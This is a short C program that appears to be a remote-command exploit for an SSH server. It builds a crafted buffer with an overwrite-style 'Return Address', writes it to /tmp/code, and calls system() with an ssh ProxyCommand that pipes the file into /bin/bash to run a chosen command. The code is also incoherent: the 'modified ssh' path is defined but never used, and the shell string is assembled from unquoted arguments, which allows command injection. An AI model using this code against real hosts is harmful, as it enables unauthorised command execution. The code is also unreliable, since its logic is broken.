#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <bsd/string.h>

/* Path to modified ssh */
#define PATH_SSH "./ssh"

int main(int argc, char *argv[])
{
    int f;
    int port;
    unsigned long *ptr;
    char *buffer, *ssh, *username, *bash_command;
    int i, username_length, packet_length, buffer_size;
    
    if (argc < 7)
    {
        printf("\nUsage: <count> <username> <host> <port> <h(i)> <bash command>\n");
        fflush(stdout);
        exit(0);
    }

    port = atoi(argv[4]);
    username = argv[2];
    username_length = strlen(username);
    buffer_size = ((username_length + 8) & ~7) + 40; // Calculate buffer size
    packet_length = buffer_size - 8; // Calculate packet length
    buffer = (char *) calloc(buffer_size, sizeof(char));
    
    if (buffer == NULL) {
        printf("\nError: Failed to allocate memory.\n");
        fflush(stdout);
        exit(1);
    }
    
    ptr = (unsigned long *) buffer;
    *(ptr++) = 0;
    *(ptr++) = 0;
    *(ptr++) = strtoul(argv[5], 0, 10);
    *(ptr++) = 0;
    *(ptr++) = 16520 + strtoul(argv[1], 0, 10);
    *(ptr++) = username_length;
    *(ptr++) = 0;
    
    for (i = 0; i < buffer_size; i += 4)
    {
        char* aux = buffer + i;
        char ch = *aux;
        *aux = *(aux + 3);
        *(aux + 3) = ch;
        ch = *(aux + 1);
        *(aux + 1) = *(aux + 2);
        *(aux + 2) = ch;
    }
    
    printf("\nUsername: %s\n", username);
    printf("\nBuffer Size: %d", buffer_size);
    printf("\nReturn Address: %p", (void *)(buffer + buffer_size - 4));
    fflush(stdout);
    
    f = open("/tmp/code", O_RDWR | O_CREAT, S_IRWXU);
    if (f < 0) {
        printf("\nError opening file\n");
        fflush(stdout);
        exit(1);
    }
    int bytes_written = write(f, buffer, packet_length);
    if (bytes_written < 0) {
        printf("\nError writing to file\n");
        fflush(stdout);
        exit(1);
    }
    close(f);
    
    bash_command = argv[6];
    int ssh_size = strlen(argv[0]) + 100 + strlen(bash_command) + strlen(argv[3]);
    ssh = (char *) calloc(ssh_size, sizeof(char));
    
    if (ssh == NULL) {
        printf("\nError: Failed to allocate memory.\n");
        fflush(stdout);
        exit(1);
    }
    
    strlcpy(ssh, argv[0], ssh_size);
    strlcat(ssh, " -p ", ssh_size);
    strlcat(ssh, argv[4], ssh_size);
    strlcat(ssh, " ", ssh_size);
    strlcat(ssh, username, ssh_size);
    strlcat(ssh, "@", ssh_size);
    strlcat(ssh, argv[3], ssh_size);
    strlcat(ssh, " '", ssh_size);
    strlcat(ssh, argv[0], ssh_size);
    strlcat(ssh, "' -o 'ProxyCommand=cat ", ssh_size);
    strlcat(ssh, "/tmp/code", ssh_size);
    strlcat(ssh, "| /usr/bin/tail -c +129 | /bin/bash'", ssh_size);

    system(ssh);

    return 0;
}
